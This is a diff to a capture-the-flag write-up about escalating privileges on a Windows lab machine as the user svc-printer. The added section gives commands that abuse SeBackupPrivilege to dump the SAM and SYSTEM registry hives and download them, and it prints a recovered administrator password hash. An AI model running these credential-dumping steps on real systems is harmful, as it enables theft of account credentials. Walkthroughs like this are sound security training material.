@@ -94,6 +94,21 @@ With the discovered information, `evil-winrm` was successful and `user` flag was
 <img width="591" height="277" alt="image" src="https://github.com/user-attachments/assets/1d3a7156-706c-4fe7-99fe-e78f9d6b0ea6" />
 <img width="998" height="283" alt="image" src="https://github.com/user-attachments/assets/e87eddb7-a45b-4fec-8f8a-4d936f0dab0d" />
 
-User `svc-printer` has multiple privileges, but `SeBackupPrivilege` and `SeRestorePrivilege` look promising.
+User `svc-printer` has multiple privileges, but `SeBackupPrivilege` looks promising.
 Also, the user is in `Server Operators` group.
 
+
+## SeBackupPrivilege
+```
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+cd Temp
+download sam
+download system
+```
+<img width="726" height="153" alt="image" src="https://github.com/user-attachments/assets/c0cf0be9-e333-4cf1-a353-2829d6cfcee5" />
+
+With the commands and `sam` and `system` file were downloaded, and `administrator` hash : `34386a771aaca697f447754e4863d38a` was recovered.\
+However, login was not successful.
